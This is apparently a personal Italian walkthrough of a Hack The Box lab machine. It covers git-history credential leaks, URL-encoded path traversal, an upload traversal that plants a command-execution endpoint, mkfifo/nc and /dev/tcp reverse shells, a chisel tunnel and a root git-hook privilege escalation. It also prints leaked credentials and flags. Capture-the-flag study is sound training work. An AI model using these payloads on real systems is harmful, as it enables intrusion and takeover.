@@ -1,0 +1,646 @@
+10.10.11.164
+
+
+
+
+
+
+PORT 80:
+
+http://10.10.11.164/            -------> si può scaricare il source code
+
+il source code che ho scaricato è una repo git:
+
+
+
+┌──(kali㉿kali)-[~/…/htb/done/opensource/source]
+└─$ ls -alrt
+total 28
+drwxr-xr-x 2 kali kali 4096 Apr 28 07:34 config
+-rwxr-xr-x 1 kali kali  110 Apr 28 07:40 build-docker.sh
+drwxr-xr-x 5 kali kali 4096 Apr 28 07:45 app
+drwxr-xr-x 8 kali kali 4096 Apr 28 08:50 .git
+-rw-r--r-- 1 kali kali  574 Apr 28 08:50 Dockerfile
+drwxr-xr-x 5 kali kali 4096 Jun 12 10:44 .
+drwxr-xr-x 4 kali kali 4096 Jun 12 11:03 ..
+
+
+
+provo a vedere se ci sono commit interessanti
+
+git log --oneline --decorate --all
+git diff ee9d9f1 a76f8f7
+
++{
++  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
++  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
++  "http.proxyStrictSSL": false
++}
+
+ ssh dev01@10.10.11.164       
+The authenticity of host '10.10.11.164 (10.10.11.164)' can't be established.
+ED25519 key fingerprint is SHA256:LbyqaUq6KgLagQJpfh7gPPdQG/iA2K4KjYGj0k9BMXk.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.11.164' (ED25519) to the list of known hosts.
+Dev01@10.10.11.164: Permission denied (publickey).
+
+
+non posso acedere usando la pwd forse (?) 
+potrebbe essere utile dopo 
+
+
+
+
+
+http://10.10.11.164/upcloud
+Upcloud   ----> sito per caricare files 
+
+
+dopo aver fatto l'upload da anche il link in cui è stato caricato il file:
+
+
+http://10.10.11.164/uploads/prova.txt
+
+
+
+dal source code vedo che controlla se il path contiene caratteri ../ ecc per evitare LFI 
+però è facilmente evitabile infatti basta mettere il path con url encoding e si riesce ad ottenere /etc/passwd
+
+http://10.10.11.164/uploads/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F/etc/passwd
+
+
+root:x:0:0:root:/root:/bin/ash
+bin:x:1:1:bin:/bin:/sbin/nologin
+daemon:x:2:2:daemon:/sbin:/sbin/nologin
+adm:x:3:4:adm:/var/adm:/sbin/nologin
+lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
+sync:x:5:0:sync:/sbin:/bin/sync
+shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
+halt:x:7:0:halt:/sbin:/sbin/halt
+mail:x:8:12:mail:/var/mail:/sbin/nologin
+news:x:9:13:news:/usr/lib/news:/sbin/nologin
+uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
+operator:x:11:0:operator:/root:/sbin/nologin
+man:x:13:15:man:/usr/man:/sbin/nologin
+postmaster:x:14:12:postmaster:/var/mail:/sbin/nologin
+cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
+ftp:x:21:21::/var/lib/ftp:/sbin/nologin
+sshd:x:22:22:sshd:/dev/null:/sbin/nologin
+at:x:25:25:at:/var/spool/cron/atjobs:/sbin/nologin
+squid:x:31:31:Squid:/var/cache/squid:/sbin/nologin
+xfs:x:33:33:X Font Server:/etc/X11/fs:/sbin/nologin
+games:x:35:35:games:/usr/games:/sbin/nologin
+cyrus:x:85:12::/usr/cyrus:/sbin/nologin
+vpopmail:x:89:89::/var/vpopmail:/sbin/nologin
+ntp:x:123:123:NTP:/var/empty:/sbin/nologin
+smmsp:x:209:209:smmsp:/var/spool/mqueue:/sbin/nologin
+guest:x:405:100:guest:/dev/null:/sbin/nologin
+nobody:x:65534:65534:nobody:/:/sbin/nologin
+
+dal source code però si vede anche che si tratta di un container docker, quindi molto probabilmente questo non è etc/passwd della macchina ma del container
+
+tra l'altro il dockerfile mette come valore di default che l'environment è PRODUCTION quindi dovrebbe essere più ristretto am a me sembra che il sito sia in modalità DDEVELOPMENT
+infatti mi esce il debug quando vado ad una pagina che non esiste
+
+80/tcp open  http    Werkzeug/2.1.2 Python/3.10.3   
+http://10.10.11.164/console
+
+c'è la console per werkzeug ma richiede il pin
+
+The console is locked and needs to be unlocked by entering the PIN. 
+You can find the PIN printed out on the standard output of your shell that runs the server. 
+
+
+posso trovare il pin sfruttando il fatto che werkzeug lo genera partendo da dei dati e si può fare il reverse come fatto qua:
+
+https://ctftime.org/writeup/17955
+
+tutti i dati che mi servono dovrei riuscire a prenderli o dai messaggi di errore o con la LFI
+
+
+purtroppo non riesco a prendere tutti i dati quindi (almeno per ora) non riesco ad utilizzare la console
+
+
+devo provare in qualche altro modo. in teoria il pin viene stampato da werkzeug su standard output, quindi viene messo nei log file se ci sono 
+se ce ne sono posso prenderli con la LFI 
+
+
+analizzando il source code purtroppo sembra che non ce ne sono:
+
+
+logfile=/dev/null
+logfile_maxbytes=0
+
+
+
+per ora non posso fare nulla su werkzeug console 
+
+
+
+l'unica funzionalità che posso provare a sfruttare è quella di upload
+
+
+
+richiesta normale con burpsuite:
+
+
+
+
+POST /upcloud HTTP/1.1
+Host: 10.10.11.164
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------128889978942370901713769602749
+Content-Length: 227
+Origin: http://10.10.11.164
+Connection: close
+Referer: http://10.10.11.164/upcloud
+Upgrade-Insecure-Requests: 1
+
+-----------------------------128889978942370901713769602749
+Content-Disposition: form-data; name="file"; filename="prova.txt"
+Content-Type: text/plain
+
+prova
+
+-----------------------------128889978942370901713769602749--
+
+
+
+
+
+
+
+("prova" è il contenuto del file)
+
+provo a mettere come filename:
+
+filename="../../../../../../../etc/prova.txt"
+
+ottengo:
+
+
+FileNotFoundError: [Errno 2] No such file or directory: '/app/public/uploads/etc/prova.txt'
+
+
+
+
+
+ha fatto di nuovo escape di ../ però /etc/ l'ha tenuto 
+
+
+file_name = get_file_name(f.filename)
+file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+f.save(file_path)
+
+
+questo è il codice che salva il file 
+
+
+get_file_name semplicemente sostituisce "../" con ""
+
+
+riesco a modificare il file views.py intercettando la request con burp e poi cambiando la parte finale della classe per aggiungere una nuova interfaccia "exec":
+
+
+ORIGINAL REQUEST:
+
+POST /upcloud HTTP/1.1
+Host: 10.10.11.164
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------67373457127006626794294514604
+Content-Length: 928
+Origin: http://10.10.11.164
+Connection: close
+Referer: http://10.10.11.164/upcloud
+Upgrade-Insecure-Requests: 1
+
+-----------------------------67373457127006626794294514604
+Content-Disposition: form-data; name="file"; filename="views.py"
+Content-Type: text/x-python
+
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/<path:path>')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+-----------------------------67373457127006626794294514604--
+
+
+
+
+
+MIA REQUEST:
+
+POST /upcloud HTTP/1.1
+Host: 10.10.11.164
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: multipart/form-data; boundary=---------------------------67373457127006626794294514604
+Content-Length: 1075
+Origin: http://10.10.11.164
+Connection: close
+Referer: http://10.10.11.164/upcloud
+Upgrade-Insecure-Requests: 1
+
+-----------------------------67373457127006626794294514604
+Content-Disposition: form-data; name="file"; filename="..//app/app/views.py"
+Content-Type: text/x-python
+
+import os
+
+from app.utils import get_file_name
+from flask import render_template, request, send_file
+
+from app import app
+
+
+@app.route('/', methods=['GET', 'POST'])
+def upload_file():
+    if request.method == 'POST':
+        f = request.files['file']
+        file_name = get_file_name(f.filename)
+        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
+        f.save(file_path)
+        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
+    return render_template('upload.html')
+
+
+@app.route('/uploads/<path:path>')
+def send_report(path):
+    path = get_file_name(path)
+    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))
+
+@app.route('/exec')
+def runcmd():
+    try:
+        return os.system(request.args.get('cmd'))
+    except:
+        return "Exit"
+-----------------------------67373457127006626794294514604--
+
+
+quindi posso eseguire comandi richiamando l'endpoint exec
+
+
+http://10.10.11.164/exec?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff|%2Fbin%2Fsh%20-i%202%3E%261|nc%2010.10.14.19%204443%20%3E%2Ftmp%2Ff
+
+/app # id
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+
+
+sono ovviamente all'interno del ontainer, devo provare a fare escape 
+
+/app # ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+10: eth0@if11: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP 
+    link/ether 02:42:ac:11:00:05 brd ff:ff:ff:ff:ff:ff
+    inet 172.17.0.5/16 brd 172.17.255.255 scope global eth0
+       valid_lft forever preferred_lft forever
+
+
+
+potrei anche in qualche modo usare le credenziali trovate con git:
+
++{
++  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
++  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
++  "http.proxyStrictSSL": false
++}
+
+
+
+come si vede da ip a  l'ip dell'host "reale" dovrebbe essere  172.17.0.1 visto che fa da router per i container docker 
+
+
+guardando dal dockerfile e i permessi interni al docker non credo che si possa fare escape (ad esempio usando privileges ecc):
+
+/app # find / -name docker.sock 2>/dev/null
+/app #
+
+/app # capsh --print
+/bin/sh: capsh: not found
+
+
+/app # fdisk -l
+/app # 
+
+
+
+non ho trovato files interessanti 
+
+
+l'unica cosa che posso fare è vedere se essendo all'interno del container riesco ad accedere a qualcosa in piu sulla macchina rispetto all'esterno
+per farlo dovrei fare port scanning 
+
+
+passo lo script port_scanning.sh 
+
+
+non riesco a passarlo usando il server web e wget non so perchè
+provo a fare l'upload dal sito
+
+
+non funziona perchè non usa bash è una shell ash (come riportato anche in uno dei file del sourcecode) e si trova in busybox
+
+busybox non supporta gli array e ha una sintassi leggermente diversa su alcune cose quindi lo script che avevo fatto non va bene , devo rifarlo
+
+
+172.17.0.1 (172.17.0.1:22) open
+172.17.0.1 (172.17.0.1:80) open
+172.17.0.1 (172.17.0.1:3000) open
+172.17.0.1 (172.17.0.1:6000) open
+172.17.0.1 (172.17.0.1:6001) open
+172.17.0.1 (172.17.0.1:6002) open
+172.17.0.1 (172.17.0.1:6003) open
+172.17.0.1 (172.17.0.1:6004) open
+172.17.0.1 (172.17.0.1:6005) open
+172.17.0.1 (172.17.0.1:6006) open
+172.17.0.1 (172.17.0.1:6007) open
+
+
+
+
+la porta 80 è la stessa del container 
+
+ssh non c'è sul container quindi non posso accedere alla porta 22
+
+provo wget sulla porta 3000 (salvo output in directory port_3000)
+
+c'è gitea:
+
+
+	<meta name="author" content="Gitea - Git with a cup of tea" />
+	<meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go" />
+
+
+
+    appVer: '1.16.6',
+
+
+
+l'accesso a gitea dal docker è difficile, dovrei fare port forward ma non ho ssh 
+
+
+cercando su google "port forward without ssh" ho trovato chisel 
+
+https://0xdf.gitlab.io/2020/08/10/tunneling-with-chisel-and-ssf-update.html
+
+su kali:
+
+
+./chisel_1.7.7_linux_amd64 server -p 8000 --reverse 
+2022/06/12 13:34:34 server: Reverse tunnelling enabled
+2022/06/12 13:34:34 server: Fingerprint nElsSy+6Sl57RQBNGcH1RcLNiFmCrmsRv5od7KQs2XA=
+2022/06/12 13:34:34 server: Listening on http://0.0.0.0:8000
+
+
+
+
+sul container:
+
+./chisel_1.7.7_linux_amd64 client 10.10.14.19:8000 R:3000:172.17.0.1:3000
+
+
+/app/public/uploads # ./chisel_1.7.7_linux_amd64 client 10.10.14.19:8000 R:3000:172.17.0.1:3000
+2022/06/12 17:39:11 client: Connecting to ws://10.10.14.19:8000
+2022/06/12 17:39:11 client: Connected (Latency 69.800119ms)
+
+
+
+a questo punto mi basta andare su:
+
+http://0.0.0.0:3000/
+
+da kali e mi trovo gitea
+ 
+
+riesco ad accedere con:
+
+dev01:Soulless_Developer#2022
+
+
+dev01 ha creato un backup della sua home directory su gitea 
+
+http://0.0.0.0:3000/dev01/home-backup
+
+da qui posso prendere tutta la directory .ssh 
+
+
+http://0.0.0.0:3000/dev01/home-backup/src/branch/main/.ssh
+
+
+ho clonato la repo sotto dev01_ssh 
+
+mi basta cmbaire i permessi di id_rsa e accedere 
+
+chmod 0600 id_rsa
+ssh -i id_rsa dev01@10.10.11.164
+
+dev01@opensource:~$ cat user.txt
+0d01dd04953e4b33111f72691d313571
+
+
+ora privesc
+
+sudo -l (con pwd Soulless_Developer#2022)
+Sorry, user dev01 may not run sudo on opensource.
+
+
+dev01@opensource:~$ find / -perm -u=s -type f 2>/dev/null
+/snap/snapd/15177/usr/lib/snapd/snap-confine
+/snap/snapd/15534/usr/lib/snapd/snap-confine
+/snap/core18/2344/bin/mount
+/snap/core18/2344/bin/ping
+/snap/core18/2344/bin/su
+/snap/core18/2344/bin/umount
+/snap/core18/2344/usr/bin/chfn
+/snap/core18/2344/usr/bin/chsh
+/snap/core18/2344/usr/bin/gpasswd
+/snap/core18/2344/usr/bin/newgrp
+/snap/core18/2344/usr/bin/passwd
+/snap/core18/2344/usr/bin/sudo
+/snap/core18/2344/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core18/2344/usr/lib/openssh/ssh-keysign
+/bin/fusermount
+/bin/umount
+/bin/mount
+/bin/su
+/bin/ping
+/usr/lib/snapd/snap-confine
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/passwd
+/usr/bin/traceroute6.iputils
+/usr/bin/newgrp
+/usr/bin/newuidmap
+/usr/bin/chsh
+/usr/bin/at
+/usr/bin/gpasswd
+/usr/bin/newgidmap
+/usr/bin/sudo
+/usr/bin/chfn
+
+
+niente nemmeno con uid
+
+
+dev01@opensource:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+dev01:x:1000:1000:dev01:/home/dev01:/bin/bash
+gitlab-www:x:999:999::/var/opt/gitlab/nginx:/bin/false
+gitlab-redis:x:997:997::/var/opt/gitlab/redis:/bin/false
+gitlab-psql:x:996:996::/var/opt/gitlab/postgresql:/bin/sh
+registry:x:995:995::/var/opt/gitlab/registry:/bin/sh
+gitlab-prometheus:x:994:994::/var/opt/gitlab/prometheus:/bin/sh
+git:x:111:113:Git Version Control,,,:/home/git:/bin/bash
+
+
+
+a parte l'utente git che ha anche la home non ci sono cose interessanti
+
+
+
+le uniche due strade sono pspy per analizzare cron oppure le porte 6001.....6005 che sono aperte 
+
+mi sembra che su quelle porte ci sta sempre upcloud (magari backup??)
+
+provo con pspy
+
+
+2022/06/12 18:02:00 CMD: UID=111  PID=1389   | /usr/local/bin/gitea web --config /etc/gitea/app.ini 
+2022/06/12 18:02:02 CMD: UID=0    PID=13721  | /bin/bash /root/meta/app/clean.sh 
+2022/06/12 18:02:02 CMD: UID=0    PID=13967  | /snap/bin/docker exec upcloud6004 hostname -i
+2022/06/12 18:03:01 CMD: UID=0    PID=14808  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git
+
+2022/06/12 18:04:02 CMD: UID=0    PID=15653  | curl --write-out %{http_code} --silent --output /dev/null http://172.17.0.5
+
+2022/06/12 18:03:01 CMD: UID=0    PID=14800  | /usr/sbin/CRON -f 
+2022/06/12 18:03:01 CMD: UID=0    PID=14803  | git status --porcelain 
+2022/06/12 18:03:01 CMD: UID=0    PID=14805  | git add . 
+2022/06/12 18:03:01 CMD: UID=0    PID=14806  | git commit -m Backup for 2022-06-12 
+2022/06/12 18:03:01 CMD: UID=0    PID=14807  | git push origin main 
+2022/06/12 18:03:01 CMD: UID=0    PID=14808  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
+2022/06/12 18:04:01 CMD: UID=0    PID=15335  | /bin/bash /usr/local/bin/git-sync 
+2022/06/12 18:04:01 CMD: UID=0    PID=15334  | /usr/sbin/CRON -f 
+2022/06/12 18:04:01 CMD: UID=0    PID=15333  | /bin/sh -c /usr/local/bin/git-sync 
+2022/06/12 18:04:01 CMD: UID=0    PID=15332  | /usr/sbin/CRON -f 
+2022/06/12 18:04:01 CMD: UID=0    PID=15331  | /usr/sbin/CRON -f 
+2022/06/12 18:04:01 CMD: UID=0    PID=15330  | /usr/sbin/CRON -f 
+2022/06/12 18:04:01 CMD: UID=0    PID=15329  | /usr/sbin/CRON -f 
+2022/06/12 18:04:01 CMD: UID=???  PID=15336  | ???
+2022/06/12 18:04:01 CMD: UID=0    PID=15340  | cp /root/config /home/dev01/.git/config 
+2022/06/12 18:04:01 CMD: UID=0    PID=15339  | /bin/bash /usr/local/bin/git-sync 
+2022/06/12 18:04:01 CMD: UID=0    PID=15338  | /bin/bash /root/meta/app/clean.sh 
+2022/06/12 18:04:01 CMD: UID=0    PID=15341  | /bin/bash /root/meta/app/clean.sh 
+2022/06/12 18:04:01 CMD: UID=0    PID=15343  | cut -d  -f1 
+2022/06/12 18:04:01 CMD: UID=0    PID=15342  | 
+2022/06/12 18:04:01 CMD: UID=0    PID=15344  | git add . 
+2022/06/12 18:04:01 CMD: UID=0    PID=15350  | /bin/bash /usr/local/bin/git-sync 
+2022/06/12 18:04:01 CMD: UID=0    PID=15351  | /bin/bash /usr/local/bin/git-sync 
+2022/06/12 18:04:02 CMD: UID=0    PID=15352  | /usr/lib/git-core/git-remote-http origin http://opensource.htb:3000/dev01/home-backup.git 
+
+
+
+qeusti mi sembrano tutti comandi potenzialmente interessanti 
+
+/root/meta/app/clean.sh         -------> non lo posso leggere / aprire
+
+git commit -m Backup for 2022-06-12 
+
+visto che ROOT fa il commit della repository di dev01 posso fargli eseguire del codice tramite i git hooks
+
+https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks
+
+devo mettere il codice sotto .git/hooks
+
+quindi sotto /home/dev01/.git/hooks
+
+The pre-commit hook is run first, before you even type in a commit message
+
+quindi voglio creare un pre-commit hook
+
+seguo più o meno:
+https://support.gitkraken.com/working-with-repositories/githooksexample/#:~:text=Open%20a%20terminal%20window%20by,the%20pre%2Dcommit%20file%20executable.
+
+
+
+dev01@opensource:~/.git/hooks$ echo "0<&196;exec 196<>/dev/tcp/10.10.14.19/4445; sh <&196 >&196 2>&196" > pre-commit
+dev01@opensource:~/.git/hooks$ cat pre-commit
+0<&196;exec 196<>/dev/tcp/10.10.14.19/4445; sh <&196 >&196 2>&196
+dev01@opensource:~/.git/hooks$ chmod +x pre-commit
+
+//non funzoionava, per farlo funzionare l'ho aperto con vi e ho aggiungo #!/bin/bash come prima riga
+
+
+─$ nc -lvnp 4445
+listening on [any] 4445 ...
+connect to [10.10.14.19] from (UNKNOWN) [10.10.11.164] 32832
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat root.txt
+cat: root.txt: No such file or directory
+cd /root
+cat root.txt
+74a591a280d582ad84ce8e9c3900a285
+
